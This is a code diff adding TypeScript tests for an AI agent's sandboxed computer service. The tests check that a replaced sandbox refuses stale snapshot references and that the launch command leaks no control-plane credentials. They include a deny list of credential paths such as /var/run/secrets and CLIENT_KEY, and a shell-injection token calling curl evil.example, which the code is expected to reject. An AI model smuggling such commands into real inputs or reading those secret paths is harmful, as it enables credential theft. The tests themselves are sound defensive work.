@@ -1,4 +1,10 @@
 import { describe, expect, test } from "../../tests/support/e2e-compat";
+import type { AuditStore } from "../src/audit";
+import { StaleSnapshotError } from "../src/computer/client";
+import { createComputerGateway } from "../src/computer/gateway";
+import {
+  createInMemorySnapshotStore,
+} from "../src/computer/snapshot-store";
 import {
   createOpenShellComputerProvider,
   OPEN_SHELL_REQUIRED_CAPABILITIES,
@@ -9,6 +15,7 @@ import {
   type OpenShellScope,
 } from "../src/computer/openshell";
 import {
+  computerServiceStartSpec,
   createOpenShellGatewayClient,
   imageLabel,
   needsReplacement,
@@ -746,5 +753,167 @@ describe("OpenShell gateway dial shape", () => {
       (error: unknown) => String(error),
     );
     expect(failure).not.toContain("Incorrect arguments passed");
+  });
+});
+
+/**
+ * T02: the sandbox the gateway hands actions to is the one the provider says it is.
+ *
+ * A replaced OpenShell sandbox (needsReplacement: image or generation moved on) is a new run with a
+ * new uid, and `sessionOf` must answer with the NEW uid — that answer is the input to the gateway's
+ * stale-ref fence, so a sessionOf that kept answering the old run would let a ref the model still
+ * holds from the dead sandbox resolve against the new one's page.
+ */
+describe("OpenShell sessionOf fences replaced sandboxes", () => {
+  test("stale_generation_cannot_reach_new_computer", async () => {
+    const calls: string[] = [];
+    // The run the sandbox itself reports: the first run, then the uid the replacement created.
+    let run = "uid-run-1";
+    const client = {
+      hasServiceAddress() {
+        return true;
+      },
+      async ensureSandbox(scope: OpenShellScope) {
+        calls.push("ensure");
+        return {
+          name: `${scope.workspaceId}--${scope.botId}`,
+          state: "ready",
+          url: "http://agent-computer:4100",
+          generation: run,
+          evidence: {
+            policy: "loaded",
+            isolation: "enforced",
+            credentials: "hidden",
+            unauthorizedDestination: "denied",
+          },
+        } satisfies OpenShellSandboxView;
+      },
+      async inspectSandbox(scope: OpenShellScope) {
+        // The read-only path `sessionOf` uses: the live run's uid, never a start.
+        return {
+          name: `${scope.workspaceId}--${scope.botId}`,
+          state: "ready",
+          generation: run,
+        } satisfies OpenShellSandboxView;
+      },
+    } as unknown as OpenShellAdminClient;
+    const provider = createOpenShellComputerProvider({
+      client,
+      scopeFor: async (botId) => ({
+        tenantId: "acme",
+        workspaceId: "research",
+        botId,
+        environment: "computer" as const,
+        generation: "gen-1",
+      }),
+      capabilities: OPEN_SHELL_REQUIRED_CAPABILITIES,
+    });
+    const snapshots = createInMemorySnapshotStore();
+    const rows: { eventType: string; payload?: unknown }[] = [];
+    const audit = {
+      async insert(event: { eventType: string; payload?: unknown }) {
+        rows.push(event);
+      },
+    } as unknown as AuditStore;
+    const snapshotAnswer = {
+      snapshotId: 7,
+      url: "https://example.com/order",
+      title: "Order",
+      truncated: false,
+      elements: [{ ref: "e9", role: "button", name: "Submit order" }],
+    };
+    const fetchImpl = (async (url: string) => {
+      calls.push(new URL(url).pathname);
+      if (new URL(url).pathname === "/snapshot") {
+        return Response.json(snapshotAnswer);
+      }
+      return Response.json({ action: "click", url: snapshotAnswer.url });
+    }) as unknown as typeof fetch;
+    const gateway = createComputerGateway({
+      provider,
+      fetchImpl,
+      auditStore: audit,
+      policy: () => ({ mode: "enforce" as const, deny: [], allow: ["true"] }),
+      snapshots,
+    });
+
+    // The snapshot is taken in the first run, so its row carries uid-run-1.
+    const taken = await gateway.snapshot("sales");
+    await gateway.click("sales", { id: "dev-local-user" }, {
+      ref: "e9",
+      snapshotId: taken.snapshotId,
+    });
+    expect(calls).toContain("/click");
+
+    // The sandbox is replaced (image digest or generation moved on): a new uid, the name unchanged.
+    run = "uid-run-2";
+    calls.length = 0;
+    const refusal = await gateway
+      .click("sales", { id: "dev-local-user" }, {
+        ref: "e9",
+        snapshotId: taken.snapshotId,
+      })
+      .catch((error: unknown) => error);
+
+    expect(refusal).toBeInstanceOf(StaleSnapshotError);
+    expect(calls).not.toContain("/click");
+
+    // The control: a snapshot of the new run resolves again, so the fence refuses only the dead run.
+    const fresh = await gateway.snapshot("sales");
+    await gateway.click("sales", { id: "dev-local-user" }, {
+      ref: "e9",
+      snapshotId: fresh.snapshotId,
+    });
+    expect(calls).toContain("/click");
+  });
+});
+
+/**
+ * T02: the command that starts the computer inside a sandbox carries the Bot's own token and the
+ * browser runtime facts, and nothing from the control plane.
+ *
+ * The gateway's exec API has no environment map, so the launch is one shell command. The token is
+ * spliced into quoted 16-character segments because the gateway's sentinel rewrites long contiguous
+ * strings, and it is charset-checked first: this string reaches a shell, so a token that could
+ * break out of it is refused rather than escaped.
+ */
+describe("OpenShell computer service launch", () => {
+  const TOKEN = "0123456789abcdef".repeat(4);
+
+  test("computer_workload_has_no_control_plane_credentials", () => {
+    const spec = computerServiceStartSpec({ token: TOKEN });
+    const command = spec.argv.join(" ");
+
+    // The Bot's token, in the four quoted segments the gateway's sentinel does not rewrite.
+    for (let i = 0; i < 4; i += 1) {
+      expect(command).toContain(`'${TOKEN.slice(i * 16, i * 16 + 16)}'`);
+    }
+    // The browser runtime facts the sandbox's policies and certificates require.
+    expect(command).toContain("COMPUTER_TOKEN=");
+    expect(command).toContain("COMPUTER_ISOLATION_RUNTIME=openshell");
+    expect(command).toContain("COMPUTER_BROWSER_MODE=headless");
+    expect(command).toContain("PLAYWRIGHT_BROWSERS_PATH=");
+    expect(command).toContain("HOME=/tmp");
+    expect(command).toContain("nohup bun");
+    expect(spec.healthUrl).toBe("http://127.0.0.1:4100/health");
+
+    // Nothing from the control plane: no Kubernetes token, no gateway PKI, no OpenShell paths.
+    for (const forbidden of [
+      "KUBERNETES_SERVICE_HOST",
+      "KUBERNETES_PORT",
+      "/var/run/secrets",
+      "CLIENT_KEY",
+      "CLIENT_CERT",
+      "ca.crt",
+      "/.openshell",
+      "OPENSHELL_GATEWAY",
+    ]) {
+      expect(command).not.toContain(forbidden);
+    }
+
+    // A token that could break out of the shell is refused, not escaped into the command.
+    expect(() =>
+      computerServiceStartSpec({ token: "abc'; curl evil.example; #" }),
+    ).toThrow(ProviderError);
   });
 });
